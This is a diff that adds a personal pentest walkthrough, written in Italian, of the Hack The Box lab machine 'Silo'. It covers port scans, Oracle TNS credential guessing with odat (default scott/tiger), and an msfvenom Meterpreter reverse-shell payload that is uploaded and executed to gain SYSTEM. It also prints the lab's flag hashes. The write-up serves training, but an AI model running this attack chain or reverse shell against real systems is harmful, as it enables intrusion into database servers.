@@ -1,0 +1,94 @@
+10.10.10.82
+
+masscan -p1-65535 --rate 1000 --banners --open -e tun0 10.10.10.82
+
+Discovered open port 139/tcp on 10.10.10.82
+Discovered open port 49161/tcp on 10.10.10.82
+Discovered open port 47001/tcp on 10.10.10.82
+Discovered open port 49152/tcp on 10.10.10.82
+Discovered open port 1521/tcp on 10.10.10.82
+Discovered open port 135/tcp on 10.10.10.82
+Discovered open port 49153/tcp on 10.10.10.82
+Discovered open port 49159/tcp on 10.10.10.82
+Discovered open port 5985/tcp on 10.10.10.82
+Discovered open port 49162/tcp on 10.10.10.82
+Discovered open port 445/tcp on 10.10.10.82
+Discovered open port 49154/tcp on 10.10.10.82
+Discovered open port 80/tcp on 10.10.10.82
+Discovered open port 49155/tcp on 10.10.10.82
+
+nmap -sC -sV -p 80,135,139,445,49161,47001,49152,1521,49153,49159,5985,49162,49154,49155  10.10.10.82
+
+80/tcp    open  http         Microsoft IIS httpd 8.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
+49161/tcp open  msrpc        Microsoft Windows RPC
+49162/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+PORTA 80:
+  c'è solo la pagina base di microsoft iss, faccio partire comunque gobuster ma non trova nulla di interessante
+
+PORTA 1521:
+  c'è oracle tns , un servizio database che può essere attaccato tramite odat.py
+
+  odat sidguesser -s 10.10.10.82 --sids-file=/home/daerves/Scrivania/git/SecNotes/lists/sids-oracle.txt
+  SIDs found on the 10.10.10.82:1521 server: ,XE,XEXDB        //il primo è un sid vuoto
+  sudo odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file /home/daerves/Scrivania/git/SecNotes/lists/oracle_odat_msf.txt
+  Valid credentials found: scott/tiger
+
+  ora posso usare sempre odat per RCE
+
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.16.2" LPORT=4242 -f exe > shell.exe
+  sudo odat utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile "c:\inetpub\wwwroot" "shell.exe" "/home/daerves/Scrivania/git/SecNotes/htb/oscp_like/silo/shell.exe"
+   //starto il listener su metasploit
+   odat externaltable -s 10.10.10.82 -U scott -P tiger -d XE --sysdba --exec "c:\inetpub\wwwroot" "shell.exe"
+
+   a questo punto sono già system:
+   C:\:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
+    whoami
+    nt authority\system
+
+    USER FLAG:
+
+    C:\Users\Phineas\Desktop>type user.txt
+    type user.txt
+    c1ab895cb67051ba4387fe6307d7704c
+
+    ROOT FLAG:
+
+    C:\Users\Administrator\Desktop>type root.txt
+    type root.txt
+    055679c321ba616171ed819f0359982e
+
+
+//questa macchina si sarebbe potuta fare in moòlti altri modi, tipo creare shell .asp e aprirla direttamente tramite web, accedere come phineas e poi fare privesc ecc.
+
+
+
+
+
+
+
+
+
+
+
+a
